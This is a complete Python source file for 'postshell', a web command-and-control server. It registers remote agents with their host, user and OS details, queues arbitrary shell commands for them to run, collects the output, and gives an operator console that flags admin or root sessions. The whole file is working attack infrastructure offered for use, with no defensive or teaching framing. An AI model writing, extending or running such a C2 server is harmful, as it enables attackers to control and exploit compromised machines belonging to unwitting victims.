import http.server
import socketserver
import threading
import sys
import urllib.parse
import time
import readline
import re
from collections import defaultdict

# ANSI color codes
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"

clients = {}
client_commands = defaultdict(str)
client_results = defaultdict(list)
lock = threading.Lock()

client_counter = 1  # Incremental numeric ID
client_id_map = {}  # Maps client_id (UUID-style) to numeric ID

MAIN_COMMANDS = ["list ", "select ", "kill ", "exit ", "help ", "? "]
SESSION_COMMANDS = ["background ", "die "]

selected_client = None  # For tab completion

# Regex for ANSI stripping
ANSI_ESCAPE = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

def strip_ansi(s):
    return ANSI_ESCAPE.sub('', s)

class MyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        client_id = self.path.strip("/").replace(".html", "")
        with lock:
            if client_id in client_commands:
                command = client_commands[client_id]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(command.encode())
                client_commands[client_id] = ""
            else:
                self.send_response(404)
                self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode()
        fields = urllib.parse.parse_qs(post_data)

        if self.path == "/register":
            client_id = fields.get("id", [""])[0]
            client_ip = self.client_address[0]
            with lock:
                global client_counter
                if client_id not in client_id_map:
                    client_id_map[client_id] = client_counter
                    client_counter += 1
                clients[client_id] = {
                    "num_id": client_id_map[client_id],
                    "hostname": fields.get("hostname", [""])[0],
                    "username": fields.get("username", [""])[0],
                    "os": fields.get("os", [""])[0],
                    "version": fields.get("version", [""])[0],
                    "arch": fields.get("arch", [""])[0],
                    "ip": client_ip,
                    "last_seen": time.time()
                }
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Registered")

        elif self.path.endswith("/result"):
            client_id = self.path.strip("/").split("/")[0]
            cmd = fields.get("cmd", [""])[0]
            result = fields.get("result", [""])[0]
            with lock:
                client_results[client_id].append((cmd, result))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Result received")

        else:
            self.send_response(404)
            self.end_headers()

def format_table(data, headers):
    stripped_data = [[strip_ansi(str(cell)) for cell in row] for row in data]
    col_widths = [
        max(len(header), max(len(row[i]) for row in stripped_data))
        for i, header in enumerate(headers)
    ]

    def pad_with_ansi(value, width):
        stripped = strip_ansi(value)
        padding = width - len(stripped)
        return value + ' ' * padding

    def make_row(values, sep="║"):
        return sep + sep.join(
            f" {pad_with_ansi(str(v), col_widths[i])} " for i, v in enumerate(values)
        ) + sep

    def make_divider(left="╠", mid="╬", right="╣", fill="═"):
        return left + mid.join(fill * (w + 2) for w in col_widths) + right

    top = make_divider("╔", "╦", "╗")
    header_row = make_row(headers)
    divider = make_divider()
    body = "\n".join(make_row(row) for row in data)
    bottom = make_divider("╚", "╩", "╝")

    return "\n".join([top, header_row, divider, body, bottom])

def colorize_user(user):
    dangerous = ["admin", "administrator", "root", "system"]
    clean_user = user.strip()
    if clean_user.lower() in dangerous:
        return f"{RED}{clean_user}{RESET}"
    return f"{GREEN}{clean_user}{RESET}"

def completer(text, state):
    global selected_client
    if selected_client:
        options = [cmd for cmd in SESSION_COMMANDS if cmd.startswith(text)]
    else:
        options = [cmd for cmd in MAIN_COMMANDS if cmd.startswith(text)]
    if state < len(options):
        return options[state]
    return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def get_client_by_num_id(num_id):
    with lock:
        for cid, info in clients.items():
            if info["num_id"] == num_id:
                return cid
    return None

def show_help():
    print(f"""
{BLUE}Menu Commands:{RESET}
    help | ?        - Show this menu
    list            - List connected sessions
    select <id>     - Connect to a session
    kill <id>       - Terminate session
    exit            - Exit the server

{BLUE}Session Commands:{RESET}
    background      - Background session
    die             - Terminate session
    """)

def cli():
    global selected_client
    print(f"""{BLUE}
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
    Web Command & Control - v0.2
{RESET}
        """)
    print(f"[+] Server running on port {port}")
    while True:
        try:
            if not selected_client:
                cmd = input(f"{BLUE}postshell>{RESET} ").strip()

                if cmd == "exit":
                    print("[!] Shutting down server and all sessions.")
                    with lock:
                        for cid in list(clients.keys()):
                            client_commands[cid] = "exit"
                        clients.clear()
                    time.sleep(1)
                    break

                elif cmd == "list":
                    with lock:
                        if not clients:
                            print("[!] No clients connected.")
                            continue

                        headers = ["ID", "IP", "HOSTNAME", "USER", "OS", "VERSION", "ARCH"]
                        data = []
                        sorted_clients = sorted(clients.items(), key=lambda item: item[1]["num_id"])
                        for cid, info in sorted_clients:
                            user_col = colorize_user(info.get("username", "").strip())
                            data.append([
                                str(info["num_id"]),
                                info.get("ip", "N/A"),
                                info.get("hostname", ""),
                                user_col,
                                info.get("os", ""),
                                info.get("version", ""),
                                info.get("arch", "")
                            ])
                        print(format_table(data, headers))

                elif cmd.startswith("select "):
                    try:
                        num_id = int(cmd.split()[1])
                        client_id = get_client_by_num_id(num_id)
                        if client_id:
                            selected_client = client_id
                        else:
                            print("Invalid client ID")
                    except:
                        print("Invalid input")

                elif cmd.startswith("kill "):
                    try:
                        num_id = int(cmd.split()[1])
                        client_id = get_client_by_num_id(num_id)
                        if client_id:
                            with lock:
                                client_commands[client_id] = "exit"
                                clients.pop(client_id, None)
                            print(f"[!] Sent kill command to {client_id}")
                        else:
                            print("Invalid client ID")
                    except:
                        print("Invalid input")

                elif cmd in ["help", "?"]:
                    show_help()

            else:
                user = clients[selected_client]['username']
                host = clients[selected_client]['hostname']
                dangerous = ["admin", "administrator", "root", "system"]
                color = RED if user.lower().strip() in dangerous else GREEN
                prompt = f"{color}[{user}@{host}]{RESET}> "
                cmd = input(prompt).strip()

                if cmd == "background":
                    selected_client = None
                elif cmd == "die":
                    with lock:
                        client_commands[selected_client] = "exit"
                        clients.pop(selected_client, None)
                    print(f"[!] Sent die command to {selected_client}")
                    selected_client = None
                elif cmd:
                    with lock:
                        client_commands[selected_client] = cmd
                    time.sleep(1)
                    with lock:
                        results = client_results[selected_client]
                        if results:
                            for c, r in results:
                                print(r)
                            client_results[selected_client].clear()
                        else:
                            print("[<] No result yet")
        except KeyboardInterrupt:
            if not selected_client:
                print("\n[!] Use 'exit' to cleanly shut down the server.")
            else:
                print("\n[!] Use 'background' to return or 'die' to terminate the session.")

def start_server(port):
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    server = socketserver.ThreadingTCPServer(("", port), MyHandler)
    server.daemon_threads = True
    t = threading.Thread(target=server.serve_forever)
    t.daemon = True
    t.start()
    return server

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    server_instance = start_server(port)
    cli()
